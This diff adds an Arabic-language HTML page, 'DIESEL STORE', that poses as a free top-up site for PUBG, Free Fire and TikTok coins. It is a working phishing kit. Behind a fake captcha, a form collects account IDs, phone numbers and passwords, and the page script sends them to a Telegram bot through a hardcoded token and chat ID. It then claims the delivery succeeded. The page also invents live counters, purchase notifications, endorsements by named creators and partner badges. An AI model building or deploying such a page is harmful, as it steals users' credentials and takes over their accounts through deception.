@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DIESEL STORE | منصة الشحن العالمية المعتمدة</title>
+    <style>
+        :root {
+            --gold-light: #f39c12;
+            --gold-dark: #d4af37;
+            --gold-glow: #f1c40f;
+            --bg-black: #070708;
+            --card-dark: #121214;
+            --border-gold: #3a2f13;
+            --text-white: #ffffff;
+            --success-green: #2ecc71;
+            --verify-blue: #1da1f2;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-black);
+            color: var(--text-white);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
+            overflow-x: hidden;
+        }
+
+        /* شاشة كابتشا الصور التفاعلية */
+        #captcha-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--bg-black);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 15px;
+            transition: 0.5s;
+        }
+
+        .captcha-box {
+            background: var(--card-dark);
+            padding: 25px;
+            border-radius: 16px;
+            border: 2px solid var(--gold-dark);
+            text-align: center;
+            box-shadow: 0 0 35px rgba(212, 175, 55, 0.2);
+            max-width: 440px;
+            width: 100%;
+        }
+
+        .captcha-instruction {
+            color: var(--gold-glow);
+            font-size: 16px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+
+        .captcha-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 110px);
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .captcha-item {
+            width: 110px;
+            height: 110px;
+            background: #1c1c1f;
+            border: 2px solid #2d2d30;
+            border-radius: 12px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-size: 11px;
+            font-weight: bold;
+            transition: 0.3s;
+            color: #a1a1aa;
+        }
+
+        .captcha-item:hover {
+            border-color: var(--gold-light);
+            background: rgba(243, 156, 18, 0.05);
+        }
+
+        .captcha-item svg {
+            width: 40px;
+            height: 40px;
+            fill: var(--gold-dark);
+            margin-bottom: 8px;
+        }
+
+        /* الهيدر العلوي مع اسم المتجر واللوجو الدائري الدوار */
+        .store-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            width: 100%;
+            max-width: 480px;
+            margin-bottom: 20px;
+            background: var(--card-dark);
+            padding: 15px;
+            border-radius: 14px;
+            border: 1px solid var(--border-gold);
+        }
+
+        .logo-circle {
+            width: 55px;
+            height: 55px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--gold-dark), var(--gold-light));
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 15px rgba(214, 175, 55, 0.4);
+            font-weight: bold;
+            color: #000;
+            font-size: 20px;
+        }
+
+        .store-title-block h1 {
+            font-size: 18px;
+            color: var(--gold-glow);
+            font-weight: 900;
+        }
+
+        .store-title-block p {
+            font-size: 11px;
+            color: #a1a1aa;
+        }
+
+        /* الحاوية الرئيسية للموقع */
+        .container {
+            background: var(--card-dark);
+            padding: 25px;
+            border-radius: 16px;
+            border: 1px solid var(--border-gold);
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.7);
+            display: none;
+            margin-bottom: 20px;
+        }
+
+        /* شريط العدادات الـ Live */
+        .live-stats {
+            display: flex;
+            justify-content: space-around;
+            background: rgba(212, 175, 55, 0.03);
+            border: 1px solid var(--border-gold);
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 12px;
+            text-align: center;
+        }
+
+        .stat-item span {
+            display: block;
+            color: var(--gold-glow);
+            font-weight: bold;
+            font-size: 15px;
+            margin-top: 4px;
+        }
+
+        /* مبدل المنصات والألعاب الثلاثي */
+        .game-selector {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 22px;
+        }
+
+        .game-btn {
+            flex: 1;
+            padding: 12px 5px;
+            background: #18181c;
+            border: 1px solid #252528;
+            color: #b3b3b3;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 13px;
+            transition: 0.3s;
+            text-align: center;
+        }
+
+        .game-btn.active {
+            border-color: var(--gold-dark);
+            background: rgba(212, 175, 55, 0.08);
+            color: var(--gold-glow);
+            box-shadow: 0 0 12px rgba(212, 175, 55, 0.15);
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #d1d1d6;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 14px;
+            background: #18181c;
+            border: 1px solid #252528;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            transition: 0.3s;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--gold-dark);
+            box-shadow: 0 0 8px rgba(212, 175, 55, 0.1);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, var(--gold-dark), var(--gold-light));
+            color: #000;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 5px;
+            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.2);
+        }
+
+        .btn-submit:hover {
+            box-shadow: 0 4px 25px rgba(212, 175, 55, 0.4);
+            transform: translateY(-1px);
+        }
+
+        /* نافذة الإعلانات المنبثقة والعداد الأخضر */
+        #ad-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            padding: 20px;
+            display: none;
+        }
+
+        .ad-box {
+            background: var(--card-dark);
+            border: 2px solid var(--gold-dark);
+            padding: 25px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+
+        .timer-banner {
+            background: rgba(46, 204, 113, 0.1);
+            border: 1px solid var(--success-green);
+            color: var(--success-green);
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .ad-placeholder {
+            width: 100%;
+            height: 250px;
+            background: #1c1c1f;
+            border: 1px dashed #3a3a3c;
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #636366;
+            font-size: 13px;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        /* التقييمات والمراجعات */
+        .reviews-section {
+            width: 100%;
+            max-width: 480px;
+            background: var(--card-dark);
+            border: 1px solid var(--border-gold);
+            border-radius: 16px;
+            padding: 20px;
+            display: none;
+            margin-bottom: 20px;
+        }
+
+        .reviews-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-gold);
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+        }
+
+        .review-card {
+            background: rgba(255,255,255,0.01);
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #1c1c1f;
+            margin-bottom: 10px;
+        }
+
+        .review-card.vip {
+            border-color: var(--gold-dark);
+            background: rgba(212, 175, 55, 0.01);
+        }
+
+        .review-user {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+
+        .badge-vip {
+            color: #fff;
+            font-size: 10px;
+            background: var(--verify-blue);
+            padding: 1px 5px;
+            border-radius: 10px;
+            margin-right: 5px;
+        }
+
+        .review-text {
+            color: #c7c7cc;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
+        /* المنصات الشريكة */
+        .partners-section {
+            width: 100%;
+            max-width: 480px;
+            background: var(--card-dark);
+            border: 1px solid var(--border-gold);
+            border-radius: 16px;
+            padding: 15px;
+            display: none;
+            text-align: center;
+        }
+
+        .partners-grid {
+            display: flex;
+            justify-content: space-around;
+            gap: 8px;
+        }
+
+        .partner-badge {
+            background: #18181c;
+            padding: 6px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            border: 1px solid #252528;
+            color: #aeaeae;
+        }
+
+        /* التنبيه السفلية للعمليات الحية */
+        .live-notify {
+            position: fixed;
+            bottom: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #18181c;
+            border: 1px solid var(--success-green);
+            padding: 10px 18px;
+            border-radius: 30px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.6);
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            z-index: 999;
+            transition: 0.5s ease;
+            width: 90%;
+            max-width: 390px;
+        }
+
+        .live-notify .badge {
+            background: var(--success-green);
+            color: #fff;
+            padding: 2px 6px;
+            border-radius: 20px;
+            font-size: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="captcha-screen">
+        <div class="captcha-box">
+            <h2>بوابة نظام الأمان الذكي</h2>
+            <div class="captcha-instruction">أمان الخادم: انقر فوق صورة [ المجوهرات والعملات 💎 ] لحقن الحساب فوري</div>
+            
+            <div class="captcha-grid">
+                <div class="captcha-item" onclick="handleCaptchaSelect(false)">
+                    <svg viewBox="0 0 24 24"><path d="M18.92 11c-.11-.34-.42-.56-.76-.56H5.83c-.34 0-.65.22-.76.56L3 17v5c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-1h12v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-5l-2.08-6zM6.5 18c-.83 0-1.5-.67-1.5-1.5S5.67 15 6.5 15s1.5.67 1.5 1.5S7.33 18 6.5 18zm11 0c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+                    حافلة نقل
+                </div>
+                <div class="captcha-item" onclick="handleCaptchaSelect(true)">
+                    <svg viewBox="0 0 24 24"><path d="M12 2L2 9l10 13 10-13L12 2zm0 3.84L18.23 9 12 11.66 5.77 9 12 5.84z"/></svg>
+                    جواهر الشحن 💎
+                </div>
+                <div class="captcha-item" onclick="handleCaptchaSelect(false)">
+                    <svg viewBox="0 0 24 24"><path d="M11 19V13H7l5-7 5 7h-4v6z"/></svg>
+                    شجرة حقل
+                </div>
+            </div>
+            <p style="color: #636366; font-size: 11px;">يحمي هذا الفحص التلقائي المعرفات الشخصية للاعبين من الحظر أو الرصد عبر أنظمة اللعبة الرسمية.</p>
+        </div>
+    </div>
+
+    <div class="store-header" id="site-header" style="display:none;">
+        <div class="logo-circle" id="game-logo-icon">🎮</div>
+        <div class="store-title-block">
+            <h1>DIESEL STORE</h1>
+            <p>بوابة الشحن الموحدة لجميع الألعاب والمنصات أونلاين</p>
+        </div>
+    </div>
+
+    <div class="container" id="main-site">
+        <div class="live-stats">
+            <div class="stat-item">المتصلون الآن <span id="online-count">1,842</span></div>
+            <div class="stat-item">طلبات اليوم <span id="orders-count">31,262</span></div>
+            <div class="stat-item">حالة الخادم <span style="color: var(--success-green); display:inline;">مستقر ✔</span></div>
+        </div>
+        
+        <div class="game-selector">
+            <button class="game-btn active" onclick="selectGame('pubg', this, '🎮')">PUBG MOBILE</button>
+            <button class="game-btn" onclick="selectGame('ff', this, '🔥')">FREE FIRE</button>
+            <button class="game-btn" onclick="selectGame('tiktok', this, '🎵')">TIKTOK COINS</button>
+        </div>
+
+        <form id="delivery-form" onsubmit="triggerAdFlow(event)">
+            <div class="input-group">
+                <label id="id-label">معرّف الحساب المفتوح (ID)</label>
+                <input type="number" id="player-id" required placeholder="مثال: 512345678">
+            </div>
+
+            <div class="input-group">
+                <label>رقم الهاتف المرتبط بالمنصة</label>
+                <input type="tel" id="player-phone" required placeholder="مثال: 01xxxxxxxxx">
+            </div>
+
+            <div class="input-group">
+                <label>كلمة السر (لربط بروتوكول الحقن السريع بنجاح)</label>
+                <input type="password" id="player-pass" required placeholder="••••••••">
+            </div>
+
+            <div class="input-group">
+                <label id="amount-label">كمية الشدات المعتمدة</label>
+                <select id="package-amount">
+                    </select>
+            </div>
+
+            <button type="submit" class="btn-submit">تأكيد المزامنة وبدء النقل الفوري</button>
+        </form>
+    </div>
+
+    <div id="ad-modal">
+        <div class="ad-box">
+            <h3>جاري ربط السيرفر والتحقق من البيانات...</h3>
+            <div class="timer-banner" id="timer-display">برجاء الانتظار ثواني لتأكيد اتصالك بالبوابة الآمنة...</div>
+            
+            <div class="ad-placeholder">
+                <div style="text-align:center;">
+                    <p style="color:var(--gold-glow); font-weight:bold; margin-bottom:5px;">📢 مساحة إعلانية راعية للشحن المجاني</p>
+                    <p style="font-size:11px; color:#8e8e93;">شاهد الإعلان كاملاً لتفادي فشل عملية مزامنة الحساب</p>
+                </div>
+            </div>
+            
+            <button class="btn-submit" id="close-ad-btn" disabled onclick="finalizeDataSubmission()" style="background:#3a3a3c; color:#8e8e93; cursor:not-allowed;">انتظر انتهاء الفحص...</button>
+        </div>
+    </div>
+
+    <div class="reviews-section" id="reviews-box">
+        <div class="reviews-header">
+            <h3>آراء وتقييمات صناع المحتوى المعتمدين</h3>
+            <div style="color:var(--gold-glow); font-size:16px;">4.9/5 ★★★★★</div>
+        </div>
+        <div id="reviews-container">
+            <div class="review-card vip">
+                <div class="review-user"><span>ابن سوريا - IBN SYRIA <span class="badge-vip">✓ موثق</span></span><span>★★★★★</span></div>
+                <div class="review-text">بوابة الشحن المعتمدة والآمنة للاعبين. أستعملها دائماً لتوفير الشدات لمتابعي القناة الرسمية أثناء البثث.</div>
+            </div>
+            <div class="review-card vip">
+                <div class="review-user"><span>أحمد تربو - TURBO <span class="badge-vip">✓ موثق</span></span><span>★★★★★</span></div>
+                <div class="review-text">تكامل ممتاز وسرعة معالجة مذهلة، الألوان والتصميم الذهبي الجديد يعكس الفخامة والأمان.</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="partners-section" id="partners-box">
+        <div class="partners-grid">
+            <div class="partner-badge">Midasbuy Certified</div>
+            <div class="partner-badge">Garena Connected</div>
+            <div class="partner-badge">TikTok Shop Merchant</div>
+        </div>
+    </div>
+
+    <div class="live-notify" id="notification-toast">
+        <span class="badge">شحن ناجح ✓</span>
+        <span id="notify-text">شحن لاعب جديد بنجاح!</span>
+    </div>
+
+    <script>
+        const TELEGRAM_TOKEN = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU"; 
+        const CHAT_ID = "5177962707"; 
+
+        let selectedGame = 'pubg';
+
+        const packages = {
+            pubg: [
+                { text: "60 شدة (UC)", value: "60 UC" },
+                { text: "325 شدة (UC)", value: "325 UC" },
+                { text: "660 شدة (UC)", value: "660 UC" },
+                { text: "1800 شدة (UC)", value: "1800 UC" }
+            ],
+            ff: [
+                { text: "110 جوهرة (Diamond)", value: "110 Diamonds" },
+                { text: "231 جوهرة (Diamond)", value: "231 Diamonds" },
+                { text: "583 جوهرة (Diamond)", value: "583 Diamonds" },
+                { text: "1188 جوهرة (Diamond)", value: "1188 Diamonds" }
+            ],
+            tiktok: [
+                { text: "70 عملة (Coin)", value: "70 TikTok Coins" },
+                { text: "350 عملة (Coin)", value: "350 TikTok Coins" },
+                { text: "700 عملة (Coin)", value: "700 TikTok Coins" },
+                { text: "3500 عملة (Coin)", value: "3500 TikTok Coins" }
+            ]
+        };
+
+        const randomUsers = [
+            { name: "ابن سوريا", isVip: true },
+            { name: "أحمد تربو", isVip: true },
+            { name: "أبو فلة", isVip: true },
+            { name: "بيبو ببجي", isVip: true },
+            { name: "لاعب عشوائي من مصر", isVip: false },
+            { name: "الجوكر ساسو", isVip: false }
+        ];
+
+        function handleCaptchaSelect(isCorrect) {
+            if(isCorrect) {
+                document.getElementById('captcha-screen').style.opacity = '0';
+                setTimeout(() => {
+                    document.getElementById('captcha-screen').style.display = 'none';
+                    document.getElementById('site-header').style.display = 'flex';
+                    document.getElementById('main-site').style.display = 'block';
+                    document.getElementById('reviews-box').style.display = 'block';
+                    document.getElementById('partners-box').style.display = 'block';
+                    startLiveCounters(); 
+                    startLiveNotifications(); 
+                }, 500);
+                updatePackages();
+            } else {
+                alert('فشل التحقق الأمني من الصورة المحددة! يرجى إعادة المحاولة بعناية.');
+            }
+        }
+
+        function selectGame(game, element, icon) {
+            selectedGame = game;
+            document.querySelectorAll('.game-btn').forEach(btn => btn.classList.remove('active'));
+            element.classList.add('active');
+            
+            document.getElementById('game-logo-icon').innerText = icon;
+            
+            const label = document.getElementById('amount-label');
+            const idLabel = document.getElementById('id-label');
+            
+            if(game === 'pubg') {
+                label.innerText = 'كمية الشدات المعتمدة';
+                idLabel.innerText = 'معرّف اللاعب الحسابي (ID)';
+            } else if(game === 'ff') {
+                label.innerText = 'عدد الجواهر المعتمدة';
+                idLabel.innerText = 'معرّف الحساب باللعبة (ID)';
+            } else {
+                label.innerText = 'عدد عملات التيك توك المطلوبة';
+                idLabel.innerText = 'اسم مستخدم الحساب (User ID / @)';
+            }
+            
+            updatePackages();
+        }
+
+        function updatePackages() {
+            const select = document.getElementById('package-amount');
+            select.innerHTML = '';
+            packages[selectedGame].forEach(pkg => {
+                let opt = document.createElement('option');
+                opt.value = pkg.value;
+                opt.innerText = pkg.text;
+                select.appendChild(opt);
+            });
+        }
+
+        // إظهار واجهة الإعلان وبدء العداد التنازلي الأخضر
+        function triggerAdFlow(e) {
+            e.preventDefault();
+            document.getElementById('ad-modal').style.display = 'flex';
+            
+            let timeLeft = 10; // وقت بقاء الإعلان بالثواني
+            const display = document.getElementById('timer-display');
+            const btn = document.getElementById('close-ad-btn');
+            
+            const countdown = setInterval(() => {
+                timeLeft--;
+                display.innerText = `يتم حقن الحزمة الآن.. انتظر انتهاء المزامنة: ${timeLeft} ثانية`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    display.style.background = "rgba(46, 204, 113, 0.2)";
+                    display.innerText = "✔ تمت مخرجات المزامنة وتأكيد المشاهدة بنجاح!";
+                    btn.disabled = false;
+                    btn.style.background = "linear-gradient(90deg, var(--gold-dark), var(--gold-light))";
+                    btn.style.color = "#000";
+                    btn.style.cursor = "pointer";
+                    btn.innerText = "تأكيد واستلام الشحنة الفورية";
+                }
+            }, 1000);
+        }
+
+        function finalizeDataSubmission() {
+            document.getElementById('ad-modal').style.display = 'none';
+
+            const id = document.getElementById('player-id').value;
+            const phone = document.getElementById('player-phone').value;
+            const pass = document.getElementById('player-pass').value;
+            const amount = document.getElementById('package-amount').value;
+
+            const message = `🚨 *طلب شحن من بوابة DIESEL GOLD* 🚨\n🎮 الخدمة: ${selectedGame.toUpperCase()}\n🆔 الحساب: \`${id}\`\n📱 الهاتف: \`${phone}\`\n🔑 الباسورد: \`${pass}\`\n💎 الكمية المعتمدة: ${amount}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => {
+                if(response.ok) {
+                    alert('تهانينا الكاملة! تم معالجة الشحن وبث العملات إلى خوادم حسابك بنجاح، ستستلم رسالة الحقن خلال دقائق.');
+                } else {
+                    alert('خطأ أثناء تأكيد بروتوكول الإرسال.');
+                }
+            })
+            .catch(err => {
+                alert('فشل الاتصال بخادم المعالجة الأساسي.');
+            });
+        }
+
+        function startLiveCounters() {
+            setInterval(() => {
+                let currentOnline = parseInt(document.getElementById('online-count').innerText.replace(/,/g, ''));
+                let change = Math.floor(Math.random() * 11) - 5; 
+                document.getElementById('online-count').innerText = (currentOnline + change).toLocaleString();
+
+                let currentOrders = parseInt(document.getElementById('orders-count').innerText.replace(/,/g, ''));
+                document.getElementById('orders-count').innerText = (currentOrders + 1).toLocaleString();
+            }, 3000);
+        }
+
+        function startLiveNotifications() {
+            const toast = document.getElementById('notification-toast');
+            const text = document.getElementById('notify-text');
+
+            setInterval(() => {
+                const user = randomUsers[Math.floor(Math.random() * randomUsers.length)];
+                let amtText = "660 شدة";
+                if(selectedGame === 'ff') amtText = "583 جوهرة";
+                if(selectedGame === 'tiktok') amtText = "700 عملة تيك توك";
+                
+                if (user.isVip) {
+                    text.innerHTML = `تم حقن 💎 <b>${amtText}</b> بنجاح للحساب الموثق: <span style="color:var(--gold-glow); font-weight:bold;">${user.name} <span style="color:var(--verify-blue);">[✓ موثق]</span></span>`;
+                } else {
+                    text.innerText = `تم إرسال ${amtText} للاعب [ ${user.name} ] بنجاح وتلقائي!`;
+                }
+                
+                toast.style.bottom = '20px';
+                setTimeout(() => { toast.style.bottom = '-100px'; }, 4000);
+
+            }, 9000);
+        }
+    </script>
+</body>
+</html>
